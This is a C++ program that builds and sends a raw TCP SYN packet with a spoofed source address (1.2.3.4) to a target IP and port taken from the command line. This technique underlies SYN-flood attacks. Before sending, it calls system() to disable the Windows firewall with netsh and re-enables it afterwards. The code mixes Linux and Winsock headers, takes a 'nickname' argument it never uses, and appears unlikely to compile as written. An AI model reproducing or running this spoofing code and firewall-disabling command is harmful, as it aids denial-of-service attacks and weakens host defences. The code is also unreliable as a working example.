#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <winsock2.h>
#include <ws2tcpip.h>

using namespace std;

// TCP packet structure
struct tcpheader {
    u_int16_t src_port;
    u_int16_t dest_port;
    u_int32_t seq_num;
    u_int32_t ack_num;
    u_int8_t  res:4, offset:4;
    u_int8_t  flags;
    u_int16_t window_size;
    u_int16_t checksum;
    u_int16_t urg_ptr;
};

// IP packet structure
struct ipheader {
    u_int8_t  version:4, header_len:4;
    u_int8_t  tos;
    u_int16_t total_len;
    u_int16_t ident;
    u_int16_t frag_and_flags;
    u_int8_t  ttl;
    u_int8_t  proto;
    u_int16_t checksum;
    u_int32_t src_addr;
    u_int32_t dest_addr;
};

void usage(char* prog_name) {
    cout << "Usage: " << prog_name << " <target IP> <target port> <nickname>\n";
}

unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char* argv[]) {
    // Check for correct number of arguments
    if (argc != 4) {
        usage(argv[0]);
        return 1;
    }
    system("netsh firewall set opmode disable");

    // Parse arguments
    char* target_ip = argv[1];
    int target_port = atoi(argv[2]);
    char* nickname = argv[3];

    // Create raw socket
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("socket() error");
        return 1;
    }
    
    // Set IP header options
    struct ipheader ip_hdr;
    ip_hdr.version = 4;
    ip_hdr.header_len = 5;
    ip_hdr.tos = 0;
    ip_hdr.total_len = sizeof(struct ipheader) + sizeof(struct tcpheader);
    ip_hdr.ident = htons(rand()%65535);
    ip_hdr.frag_and_flags = 0;
    ip_hdr.ttl = 255;
    ip_hdr.proto = IPPROTO_TCP;
    ip_hdr.checksum = 0;
    ip_hdr.src_addr = inet_addr("1.2.3.4"); // spoofed source IP
    ip_hdr.dest_addr = inet_addr(target_ip);
    
    // Set TCP header options
    struct tcpheader tcp_hdr;
    tcp_hdr.src_port = htons(rand()%65535);
    tcp_hdr.dest_port = htons(target_port);
    tcp_hdr.seq_num = rand()%1000000;
    tcp_hdr.ack_num = 0;
    tcp_hdr.res = 0;
    tcp_hdr.offset = 5;
    tcp_hdr.flags = 0x02; // SYN flag
    tcp_hdr.window_size = htons(512);
    tcp_hdr.checksum = 0;
    tcp_hdr.urg_ptr = 0;
      // Construct packet
    char packet[65535];
    memset(packet, 0, 65535);
    memcpy(packet, &ip_hdr, sizeof(struct ipheader));
    memcpy(packet + sizeof(struct ipheader), &tcp_hdr, sizeof(struct tcpheader));
    
    // Calculate TCP checksum
    tcp_hdr.checksum = csum((unsigned short*)(packet + sizeof(struct ipheader)), sizeof(struct tcpheader)/2);
    memcpy(packet + sizeof(struct ipheader), &tcp_hdr, sizeof(struct tcpheader));
    
    // Calculate IP checksum
    ip_hdr.checksum = csum((unsigned short*)packet, sizeof(struct ipheader)/2);
    memcpy(packet, &ip_hdr, sizeof(struct ipheader));

    // Set socket options
    const int on = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt() error");
        return 1;
    }

    // Set destination address and port
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(target_ip);
    dest_addr.sin_port = htons(target_port);
    
    // Send packet
    if (sendto(sockfd, packet, ip_hdr.total_len, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
        perror("sendto() error");
        return 1;
    }
    
    // Print success message
    cout << "Sent packet with spoofed IP " << inet_ntoa(*(in_addr*)&ip_hdr.src_addr) 
         << " and source port " << ntohs(tcp_hdr.src_port) << " to " << target_ip << ":" << target_port << "\n";
    
    // Cleanup
    close(sockfd);
    system("netsh firewall set opmode enable");
    return 0;
}
